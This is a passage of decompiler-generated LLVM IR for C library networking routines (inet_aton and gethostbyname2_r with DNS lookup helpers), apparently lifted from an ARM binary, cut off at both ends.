  %v2_1bba8 = icmp eq i8 %v2_1bba4, 0
  %v0_1bbac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1bba8, i32 %v0_1bbac)
  br label %dec_label_pc_1bb90

; uselistorder directives
  uselistorder i32 %v0_1bb98, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1bba4, { 1, 0 }
  uselistorder label %dec_label_pc_1bb90, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1bbb8 = load i32, i32* @r4, align 4
  store i32 %v3_1bbb8, i32* %stack_var_-28, align 4
  %v0_1bbc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bbc0 = icmp eq i32 %v0_1bbc0, 0
  br i1 %v2_1bbc0, label %dec_label_pc_1bc9c, label %dec_label_pc_1bbd0

dec_label_pc_1bbd0:                               ; preds = %entry
  br label %dec_label_pc_1bbe8

dec_label_pc_1bbe8:                               ; preds = %dec_label_pc_1bbd0, %dec_label_pc_1bc60
  %v1_1bc60 = phi i32 [ 0, %dec_label_pc_1bbd0 ], [ %v5_1bc60, %dec_label_pc_1bc60 ]
  %v0_1bc64 = phi i32 [ 1, %dec_label_pc_1bbd0 ], [ %v1_1bc64, %dec_label_pc_1bc60 ]
  %v0_1bbe8 = phi i32 [ %v0_1bbc0, %dec_label_pc_1bbd0 ], [ %v0_1bbe812, %dec_label_pc_1bc60 ]
  %v1_1bbe8 = inttoptr i32 %v0_1bbe8 to i8*
  %v2_1bbe8 = load i8, i8* %v1_1bbe8, align 1
  %v3_1bbe8 = zext i8 %v2_1bbe8 to i32
  %v4_1bbec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 580) to i32*), align 4
  %v2_1bbf0 = mul nuw nsw i32 %v3_1bbe8, 2
  %v2_1bbf4 = add i32 %v2_1bbf0, %v4_1bbec
  %v3_1bbf4 = inttoptr i32 %v2_1bbf4 to i16*
  %v4_1bbf4 = load i16, i16* %v3_1bbf4, align 2
  %v1_1bbf8 = and i16 %v4_1bbf4, 8
  %v2_1bbf8 = icmp eq i16 %v1_1bbf8, 0
  br i1 %v2_1bbf8, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc00

dec_label_pc_1bc00:                               ; preds = %dec_label_pc_1bbe8
  br label %dec_label_pc_1bc20

dec_label_pc_1bc08:                               ; preds = %dec_label_pc_1bc20
  %v2_1bc08 = mul i32 %v0_1bc60, 10
  %v1_1bc0c = add i32 %v2_1bc08, -48
  %v2_1bc10 = add i32 %v3_1bc20, %v1_1bc0c
  %v8_1bc18 = icmp sgt i32 %v2_1bc10, 255
  br i1 %v8_1bc18, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc1c

dec_label_pc_1bc1c:                               ; preds = %dec_label_pc_1bc08
  %v1_1bc1c = add i32 %v0_1bc50, 1
  store i32 %v1_1bc1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc20

dec_label_pc_1bc20:                               ; preds = %dec_label_pc_1bc00, %dec_label_pc_1bc1c
  %v0_1bc60 = phi i32 [ 0, %dec_label_pc_1bc00 ], [ %v2_1bc10, %dec_label_pc_1bc1c ]
  %v0_1bc50 = phi i32 [ %v0_1bbe8, %dec_label_pc_1bc00 ], [ %v1_1bc1c, %dec_label_pc_1bc1c ]
  %v1_1bc20 = inttoptr i32 %v0_1bc50 to i8*
  %v2_1bc20 = load i8, i8* %v1_1bc20, align 1
  %v3_1bc20 = zext i8 %v2_1bc20 to i32
  %v2_1bc24 = mul nuw nsw i32 %v3_1bc20, 2
  %v2_1bc28 = add i32 %v2_1bc24, %v4_1bbec
  %v3_1bc28 = inttoptr i32 %v2_1bc28 to i16*
  %v4_1bc28 = load i16, i16* %v3_1bc28, align 2
  %v6_1bc28 = zext i16 %v4_1bc28 to i32
  %v1_1bc2c = and i32 %v6_1bc28, 8
  %v2_1bc2c = icmp eq i32 %v1_1bc2c, 0
  br i1 %v2_1bc2c, label %dec_label_pc_1bc34, label %dec_label_pc_1bc08

dec_label_pc_1bc34:                               ; preds = %dec_label_pc_1bc20
  %v7_1bc34 = icmp eq i32 %v0_1bc64, 4
  br i1 %v7_1bc34, label %dec_label_pc_1bc4c, label %dec_label_pc_1bc3c

dec_label_pc_1bc3c:                               ; preds = %dec_label_pc_1bc34
  %v7_1bc3c = icmp eq i8 %v2_1bc20, 46
  br i1 %v7_1bc3c, label %dec_label_pc_1bc44, label %dec_label_pc_1bc9c

dec_label_pc_1bc44:                               ; preds = %dec_label_pc_1bc3c
  %v1_1bc44 = add i32 %v0_1bc50, 1
  store i32 %v1_1bc44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc60

dec_label_pc_1bc4c:                               ; preds = %dec_label_pc_1bc34
  %v2_1bc4c = icmp eq i8 %v2_1bc20, 0
  %v1_1bc50 = add i32 %v0_1bc50, 1
  store i32 %v1_1bc50, i32* %r0.global-to-local, align 4
  br i1 %v2_1bc4c, label %dec_label_pc_1bc60, label %dec_label_pc_1bc58

dec_label_pc_1bc58:                               ; preds = %dec_label_pc_1bc4c
  %v1_1bc58 = and i32 %v6_1bc28, 32
  %v2_1bc58 = icmp eq i32 %v1_1bc58, 0
  br i1 %v2_1bc58, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc60

dec_label_pc_1bc60:                               ; preds = %dec_label_pc_1bc58, %dec_label_pc_1bc4c, %dec_label_pc_1bc44
  %v0_1bbe812 = phi i32 [ %v1_1bc50, %dec_label_pc_1bc58 ], [ %v1_1bc50, %dec_label_pc_1bc4c ], [ %v1_1bc44, %dec_label_pc_1bc44 ]
  %v4_1bc60 = mul i32 %v1_1bc60, 256
  %v5_1bc60 = or i32 %v0_1bc60, %v4_1bc60
  %v1_1bc64 = add nuw nsw i32 %v0_1bc64, 1
  %v7_1bc6c = icmp slt i32 %v1_1bc64, 5
  br i1 %v7_1bc6c, label %dec_label_pc_1bbe8, label %dec_label_pc_1bc70

dec_label_pc_1bc70:                               ; preds = %dec_label_pc_1bc60
  %v2_1bc70 = icmp eq i32 %arg2, 0
  br i1 %v2_1bc70, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1bc70
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bca0

bb:                                               ; preds = %dec_label_pc_1bc70
  %v4_1bc74 = udiv i32 %v5_1bc60, 16777216
  %v2_1bc78 = udiv i32 %v5_1bc60, 256
  %v5_1bc7c = and i32 %v2_1bc78, 65280
  %v2_1bc80 = and i32 %v5_1bc60, ptrtoint (i32* @global_var_ff00.40 to i32)
  %v5_1bc84 = mul i32 %v2_1bc80, 256
  %v5_1bc88 = mul i32 %v0_1bc60, 16777216
  %v6_1bc7c = or i32 %v4_1bc74, %v5_1bc88
  %v6_1bc84 = or i32 %v6_1bc7c, %v5_1bc7c
  %v6_1bc88 = or i32 %v6_1bc84, %v5_1bc84
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1bc94 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1bc88, i32* %v3_1bc94, align 4
  %v2_1bca0.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1bca4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bca0

dec_label_pc_1bc9c:                               ; preds = %dec_label_pc_1bc3c, %dec_label_pc_1bc58, %dec_label_pc_1bbe8, %dec_label_pc_1bc08, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bca0

dec_label_pc_1bca0:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1bc9c
  %v1_1bca4 = phi i32 [ %v1_1bca4.pre, %bb ], [ 0, %dec_label_pc_1bc9c ], [ 1, %.thread7.thread ]
  %v2_1bca0 = phi i32 [ %v2_1bca0.pre, %bb ], [ %v3_1bbb8, %dec_label_pc_1bc9c ], [ %v3_1bbb8, %.thread7.thread ]
  store i32 %v2_1bca0, i32* @r4, align 4
  ret i32 %v1_1bca4

; uselistorder directives
  uselistorder i32 %v1_1bc64, { 1, 0 }
  uselistorder i32 %v5_1bc60, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1bc50, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.40 to i32), { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1bca0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bc9c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1bc20, { 1, 0 }
  uselistorder label %dec_label_pc_1bbe8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_1bcb0 = load i32, i32* @r6, align 4
  %v12_1bcb0 = load i32, i32* @r7, align 4
  %v15_1bcb0 = load i32, i32* @r8, align 4
  %v18_1bcb0 = load i32, i32* @sb, align 4
  %v21_1bcb0 = load i32, i32* @sl, align 4
  %v24_1bcb0 = load i32, i32* @fp, align 4
  %v7_1bcb4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1bcb4, label %dec_label_pc_1bcd8, label %dec_label_pc_1bcf8

dec_label_pc_1bcd8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1bcf0 = call i32 @gethostbyname_r()
  store i32 %v0_1bcf0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1bcf8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1bd00 = icmp eq i32 %arg2, 10
  %v2_1bd04 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1bd04, align 4
  br i1 %v7_1bd00, label %dec_label_pc_1bd0c, label %dec_label_pc_1bf40

dec_label_pc_1bd0c:                               ; preds = %dec_label_pc_1bcf8
  %v1_1bd0c = load i32, i32* @r7, align 4
  %v9_1bd0c = icmp eq i32 %v1_1bd0c, %arg1
  br i1 %v9_1bd0c, label %dec_label_pc_1bf40, label %dec_label_pc_1bd14

dec_label_pc_1bd14:                               ; preds = %dec_label_pc_1bd0c
  %v0_1bd14 = call i32 @__GI___errno_location()
  store i32 %v0_1bd14, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1bd14, i32* @r5, align 4
  %v0_1bd20 = load i32, i32* @r4, align 4
  %v0_1bd24 = load i32, i32* @r6, align 4
  store i32 %v0_1bd24, i32* %r2.global-to-local, align 4
  %v1_1bd28 = inttoptr i32 %v0_1bd14 to i32*
  %v2_1bd28 = load i32, i32* %v1_1bd28, align 4
  store i32 %v2_1bd28, i32* @r4, align 4
  %v0_1bd2c = load i32, i32* @r8, align 4
  store i32 %v0_1bd2c, i32* %r3.global-to-local, align 4
  %v0_1bd30 = load i32, i32* @r7, align 4
  store i32 %v0_1bd30, i32* %v1_1bd28, align 4
  %v0_1bd34 = load i32, i32* @sb, align 4
  store i32 %v0_1bd34, i32* %r0.global-to-local, align 4
  %v2_1bd38 = load i32, i32* @sl, align 4
  %v5_1bd38 = load i32, i32* %ip.global-to-local, align 4
  %v0_1bd3c = load i32, i32* @fp, align 4
  %v7_1bd40 = call i32 @__get_hosts_byname_r(i32 %v0_1bd34, i32 %v0_1bd20, i32 %v0_1bd24, i32 %v0_1bd2c, i32 %v2_1bd38, i32 %v5_1bd38, i32 %v0_1bd3c)
  store i32 %v7_1bd40, i32* %r0.global-to-local, align 4
  %v2_1bd44 = icmp eq i32 %v7_1bd40, 0
  br i1 %v2_1bd44, label %bb, label %dec_label_pc_1bd50

bb:                                               ; preds = %dec_label_pc_1bd14
  %v1_1bd48 = load i32, i32* @r4, align 4
  %v2_1bd48 = load i32, i32* @r5, align 4
  %v3_1bd48 = inttoptr i32 %v2_1bd48 to i32*
  store i32 %v1_1bd48, i32* %v3_1bd48, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1bd50:                               ; preds = %dec_label_pc_1bd14
  %v0_1bd50 = load i32, i32* @fp, align 4
  %v1_1bd50 = inttoptr i32 %v0_1bd50 to i32*
  %v2_1bd50 = load i32, i32* %v1_1bd50, align 4
  store i32 %v2_1bd50, i32* %r3.global-to-local, align 4
  %v7_1bd54 = icmp eq i32 %v2_1bd50, 1
  br i1 %v7_1bd54, label %dec_label_pc_1bd70, label %dec_label_pc_1bd5c

dec_label_pc_1bd5c:                               ; preds = %dec_label_pc_1bd50
  %v7_1bd5c = icmp eq i32 %v2_1bd50, 4
  br i1 %v7_1bd5c, label %dec_label_pc_1bd8c, label %dec_label_pc_1bd64

dec_label_pc_1bd64:                               ; preds = %dec_label_pc_1bd5c
  %v3_1bd64 = icmp eq i32 %v2_1bd50, -1
  br i1 %v3_1bd64, label %dec_label_pc_1bd80, label %dec_label_pc_1bf44

dec_label_pc_1bd70:                               ; preds = %dec_label_pc_1bd50
  %v7_1bd70 = icmp eq i32 %v7_1bd40, 2
  br i1 %v7_1bd70, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_1bd70
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1bd90

.thread1:                                         ; preds = %dec_label_pc_1bd70
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1bd90

dec_label_pc_1bd80:                               ; preds = %dec_label_pc_1bd64
  %v0_1bd80 = load i32, i32* @r5, align 4
  %v1_1bd80 = inttoptr i32 %v0_1bd80 to i32*
  %v2_1bd80 = load i32, i32* %v1_1bd80, align 4
  store i32 %v2_1bd80, i32* %r3.global-to-local, align 4
  %v7_1bd84 = icmp eq i32 %v2_1bd80, 2
  br i1 %v7_1bd84, label %dec_label_pc_1bd8c, label %dec_label_pc_1bf44

dec_label_pc_1bd8c:                               ; preds = %dec_label_pc_1bd80, %dec_label_pc_1bd5c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1bd90

dec_label_pc_1bd90:                               ; preds = %bb29, %.thread1, %dec_label_pc_1bd8c
  %v0_1bd90 = load i32, i32* @r8, align 4
  %v1_1bd90 = sub i32 0, %v0_1bd90
  %v1_1bd94 = urem i32 %v1_1bd90, 4
  store i32 %v1_1bd94, i32* %r0.global-to-local, align 4
  %v1_1bd98 = load i32, i32* @sl, align 4
  %v2_1bd98 = sub i32 %v1_1bd98, %v1_1bd94
  %v1_1bd9c = add i32 %v2_1bd98, -24
  store i32 %v1_1bd9c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1bda8 = load i32, i32* @r4, align 4
  %v1_1bda8 = load i32, i32* @r5, align 4
  %v2_1bda8 = inttoptr i32 %v1_1bda8 to i32*
  store i32 %v0_1bda8, i32* %v2_1bda8, align 4
  %v7_1bdac = icmp sgt i32 %v1_1bd9c, 255
  br i1 %v7_1bdac, label %dec_label_pc_1bdb8, label %bb30

bb30:                                             ; preds = %dec_label_pc_1bd90
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1bdb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bdb0 = load i32, i32* @fp, align 4
  %v2_1bdb0 = inttoptr i32 %v1_1bdb0 to i32*
  store i32 %v0_1bdb0, i32* %v2_1bdb0, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1bdb8:                               ; preds = %dec_label_pc_1bd90
  %v0_1bdb03 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bdb04 = load i32, i32* @fp, align 4
  %v2_1bdb05 = inttoptr i32 %v1_1bdb04 to i32*
  store i32 %v0_1bdb03, i32* %v2_1bdb05, align 4
  %v0_1bdb8 = load i32, i32* @r8, align 4
  %v1_1bdb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bdb8 = add i32 %v1_1bdb8, %v0_1bdb8
  store i32 %v2_1bdb8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1bdc0 = add i32 %v2_1bdb8, 16
  store i32 %v1_1bdc0, i32* %r2.global-to-local, align 4
  %v1_1bdc4 = add i32 %v2_1bdb8, 24
  store i32 %v1_1bdc4, i32* @r5, align 4
  %v3_1bdcc = inttoptr i32 %v1_1bdc0 to i32*
  store i32 %v2_1bdb8, i32* %v3_1bdcc, align 4
  %v0_1bdd0 = load i32, i32* @sb, align 4
  store i32 %v0_1bdd0, i32* @r1, align 4
  %v0_1bdd4 = load i32, i32* @r4, align 4
  %v1_1bdd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1bdd4 = add i32 %v1_1bdd4, 4
  %v3_1bdd4 = inttoptr i32 %v2_1bdd4 to i32*
  store i32 %v0_1bdd4, i32* %v3_1bdd4, align 4
  %v0_1bdd8 = load i32, i32* @r5, align 4
  store i32 %v0_1bdd8, i32* %r0.global-to-local, align 4
  %v0_1bddc = load i32, i32* @sl, align 4
  store i32 %v0_1bddc, i32* %r2.global-to-local, align 4
  %v3_1bde0 = call i32 @strncpy(i32 %v0_1bdd8, i32 %v0_1bdd0, i32 %v0_1bddc)
  %v0_1bde4 = load i32, i32* @r4, align 4
  %v1_1bde4 = trunc i32 %v0_1bde4 to i8
  %v2_1bde4 = load i32, i32* @r5, align 4
  %v3_1bde4 = load i32, i32* @sl, align 4
  %v4_1bde4 = add i32 %v3_1bde4, %v2_1bde4
  %v5_1bde4 = inttoptr i32 %v4_1bde4 to i8*
  store i8 %v1_1bde4, i8* %v5_1bde4, align 1
  %v0_1bde8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1bdf0 = load i32, i32* @r8, align 4
  store i32 %v0_1bdf0, i32* %r2.global-to-local, align 4
  %v3_1bdf4 = inttoptr i32 %v0_1bde8 to i8*
  %v4_1bdf4 = call i32 @inet_pton(i32 10, i8* %v3_1bdf4, i32 %v0_1bdf0)
  store i32 %v4_1bdf4, i32* %r0.global-to-local, align 4
  %v1_1bdf8 = load i32, i32* @r4, align 4
  %v9_1bdf8 = icmp eq i32 %v4_1bdf4, %v1_1bdf8
  br i1 %v9_1bdf8, label %dec_label_pc_1be30, label %dec_label_pc_1be00

dec_label_pc_1be00:                               ; preds = %dec_label_pc_1bdb8
  store i32 %v1_1bdc0, i32* @ip, align 4
  %v0_1be08 = load i32, i32* @r6, align 4
  store i32 %v0_1be08, i32* %v2_1bd04, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1be10 = load i32, i32* @r6, align 4
  %v2_1be10 = add i32 %v1_1be10, 8
  %v3_1be10 = inttoptr i32 %v2_1be10 to i32*
  store i32 10, i32* %v3_1be10, align 4
  %v0_1be14 = load i32, i32* @r4, align 4
  store i32 %v0_1be14, i32* %r0.global-to-local, align 4
  %v0_1be18 = load i32, i32* %r3.global-to-local, align 4
  %v1_1be18 = add i32 %v0_1be18, 6
  store i32 %v1_1be18, i32* %r3.global-to-local, align 4
  %v1_1be1c = load i32, i32* @r6, align 4
  %v2_1be1c = add i32 %v1_1be1c, 12
  %v3_1be1c = inttoptr i32 %v2_1be1c to i32*
  store i32 %v1_1be18, i32* %v3_1be1c, align 4
  %v0_1be20 = load i32, i32* @r5, align 4
  %v1_1be20 = load i32, i32* @r6, align 4
  %v2_1be20 = inttoptr i32 %v1_1be20 to i32*
  store i32 %v0_1be20, i32* %v2_1be20, align 4
  %v0_1be24 = load i32, i32* @ip, align 4
  %v1_1be24 = load i32, i32* @r6, align 4
  %v2_1be24 = add i32 %v1_1be24, 16
  %v3_1be24 = inttoptr i32 %v2_1be24 to i32*
  store i32 %v0_1be24, i32* %v3_1be24, align 4
  %v0_1be28 = load i32, i32* @r4, align 4
  %v1_1be28 = load i32, i32* @fp, align 4
  %v2_1be28 = inttoptr i32 %v1_1be28 to i32*
  store i32 %v0_1be28, i32* %v2_1be28, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1be30:                               ; preds = %dec_label_pc_1bdb8
  %v0_1be30 = load i32, i32* @r7, align 4
  %v2_1be30 = icmp eq i32 %v0_1be30, 0
  br i1 %v2_1be30, label %dec_label_pc_1be38, label %dec_label_pc_1bf30

dec_label_pc_1be38:                               ; preds = %dec_label_pc_1be30
  %v2_1be38 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1be38, i32* @r4, align 4
  store i32 %v2_1be38, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1be48 = bitcast i32* %stack_var_-84 to i8*
  %v3_1be48 = call i32 @__GI_memset(i8* %v2_1be48, i32 0)
  store i32 %v3_1be48, i32* %r0.global-to-local, align 4
  %v2_1be50 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1be50, i32* @sb, align 4
  %v7_1be90 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1be54

dec_label_pc_1be54:                               ; preds = %dec_label_pc_1bea8, %dec_label_pc_1be38
  store i32 %v2_1be50, i32* %r2.global-to-local, align 4
  store i32 %v2_1be38, i32* %r3.global-to-local, align 4
  %v0_1be60 = load i32, i32* @r5, align 4
  store i32 %v0_1be60, i32* %r0.global-to-local, align 4
  %v4_1be64 = inttoptr i32 %v0_1be60 to i8*
  %v5_1be64 = call i32 @__dns_lookup(i8* %v4_1be64, i32 28, i32 %v2_1be50, i32 %v2_1be38)
  store i32 %v5_1be64, i32* @r4, align 4
  %v1_1be68 = icmp slt i32 %v5_1be64, 0
  %v0_1be6c = load i32, i32* @sl, align 4
  store i32 %v0_1be6c, i32* %r2.global-to-local, align 4
  %v0_1be70 = load i32, i32* @r7, align 4
  %v1_1be70 = add i32 %v0_1be70, 1
  store i32 %v1_1be70, i32* @r7, align 4
  %v0_1be74 = load i32, i32* @r5, align 4
  store i32 %v0_1be74, i32* %r0.global-to-local, align 4
  br i1 %v1_1be68, label %dec_label_pc_1bf30, label %dec_label_pc_1be7c

dec_label_pc_1be7c:                               ; preds = %dec_label_pc_1be54
  %v3_1be7c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1be7c, i32* @r1, align 4
  %v3_1be80 = call i32 @strncpy(i32 %v0_1be74, i32 %v3_1be7c, i32 %v0_1be6c)
  %v3_1be84 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1be84, i32* @r0, align 4
  %v0_1be88 = call i32 @free()
  store i32 %v0_1be88, i32* %r0.global-to-local, align 4
  %v0_1be94 = load i32, i32* @r4, align 4
  store i32 %v0_1be94, i32* %r2.global-to-local, align 4
  %v0_1be98 = load i32, i32* @r5, align 4
  store i32 %v0_1be98, i32* @r3, align 4
  br i1 %v7_1be90, label %dec_label_pc_1bea0, label %dec_label_pc_1bed8

dec_label_pc_1bea0:                               ; preds = %dec_label_pc_1be7c
  %v0_1bea0 = load i32, i32* @r7, align 4
  %v8_1bea4 = icmp sgt i32 %v0_1bea0, 5
  br i1 %v8_1bea4, label %dec_label_pc_1becc, label %dec_label_pc_1bea8

dec_label_pc_1bea8:                               ; preds = %dec_label_pc_1bea0
  store i32 %tmp8, i32* @r1, align 4
  %v3_1beac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1beac, i32* %r0.global-to-local, align 4
  %v0_1beb0 = load i32, i32* @sl, align 4
  %v5_1beb4 = call i32 @__decode_dotted(i32 %v3_1beac, i32 %tmp8, i32 %v0_1be94, i32 %v0_1be98, i32 %v0_1beb0)
  store i32 %v5_1beb4, i32* @r4, align 4
  %v3_1bebc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1bebc, i32* @r0, align 4
  %v0_1bec0 = call i32 @free()
  store i32 %v0_1bec0, i32* %r0.global-to-local, align 4
  %v0_1bec4 = load i32, i32* @r4, align 4
  %v1_1bec4 = icmp slt i32 %v0_1bec4, 0
  br i1 %v1_1bec4, label %dec_label_pc_1becc, label %dec_label_pc_1be54

dec_label_pc_1becc:                               ; preds = %dec_label_pc_1bea8, %dec_label_pc_1bea0
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf38

dec_label_pc_1bed8:                               ; preds = %dec_label_pc_1be7c
  %v7_1bed8 = icmp eq i32 %tmp9, 28
  br i1 %v7_1bed8, label %dec_label_pc_1bee0, label %dec_label_pc_1bf28

dec_label_pc_1bee0:                               ; preds = %dec_label_pc_1bed8
  store i32 16, i32* @r2, align 4
  %v0_1bee8 = load i32, i32* @r8, align 4
  store i32 %v0_1bee8, i32* @r0, align 4
  %v0_1beec = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1bdc0, i32* %r2.global-to-local, align 4
  %v1_1bef8 = load i32, i32* @r6, align 4
  %v2_1bef8 = add i32 %v1_1bef8, 8
  %v3_1bef8 = inttoptr i32 %v2_1bef8 to i32*
  store i32 10, i32* %v3_1bef8, align 4
  %v0_1befc = load i32, i32* %r3.global-to-local, align 4
  %v1_1befc = add i32 %v0_1befc, 6
  store i32 %v1_1befc, i32* %r3.global-to-local, align 4
  %v1_1bf00 = load i32, i32* @r6, align 4
  %v2_1bf00 = add i32 %v1_1bf00, 12
  %v3_1bf00 = inttoptr i32 %v2_1bf00 to i32*
  store i32 %v1_1befc, i32* %v3_1bf00, align 4
  %v3_1bf04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1bf04, i32* @r0, align 4
  %v0_1bf08 = load i32, i32* @r5, align 4
  %v1_1bf08 = load i32, i32* @r6, align 4
  %v2_1bf08 = inttoptr i32 %v1_1bf08 to i32*
  store i32 %v0_1bf08, i32* %v2_1bf08, align 4
  %v0_1bf0c = load i32, i32* %r2.global-to-local, align 4
  %v1_1bf0c = load i32, i32* @r6, align 4
  %v2_1bf0c = add i32 %v1_1bf0c, 16
  %v3_1bf0c = inttoptr i32 %v2_1bf0c to i32*
  store i32 %v0_1bf0c, i32* %v3_1bf0c, align 4
  %v0_1bf10 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1bf20 = load i32, i32* @r6, align 4
  store i32 %v0_1bf20, i32* %v2_1bd04, align 4
  %v0_1bf38.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf38

dec_label_pc_1bf28:                               ; preds = %dec_label_pc_1bed8
  %v3_1bf28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1bf28, i32* @r0, align 4
  %v0_1bf2c = call i32 @free()
  store i32 %v0_1bf2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf30

dec_label_pc_1bf30:                               ; preds = %dec_label_pc_1be54, %dec_label_pc_1be30, %dec_label_pc_1bf28
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1bf38

dec_label_pc_1bf38:                               ; preds = %dec_label_pc_1bee0, %dec_label_pc_1becc, %dec_label_pc_1bf30
  %v0_1bf38 = phi i32 [ %v0_1bf38.pre, %dec_label_pc_1bee0 ], [ 3, %dec_label_pc_1becc ], [ 1, %dec_label_pc_1bf30 ]
  %v1_1bf38 = load i32, i32* @fp, align 4
  %v2_1bf38 = inttoptr i32 %v1_1bf38 to i32*
  store i32 %v0_1bf38, i32* %v2_1bf38, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1bf40:                               ; preds = %dec_label_pc_1bcf8, %dec_label_pc_1bd0c
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf44

dec_label_pc_1bf44:                               ; preds = %bb, %bb30, %dec_label_pc_1bd80, %dec_label_pc_1bd64, %dec_label_pc_1bf38, %dec_label_pc_1be00, %dec_label_pc_1bcd8, %dec_label_pc_1bf40
  store i32 %v9_1bcb0, i32* @r6, align 4
  store i32 %v12_1bcb0, i32* @r7, align 4
  store i32 %v15_1bcb0, i32* @r8, align 4
  store i32 %v18_1bcb0, i32* @sb, align 4
  store i32 %v21_1bcb0, i32* @sl, align 4
  store i32 %v24_1bcb0, i32* @fp, align 4
  %v1_1bf4c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1bf4c

; uselistorder directives
  uselistorder i32 %v2_1be38, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1bdc0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1bd94, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
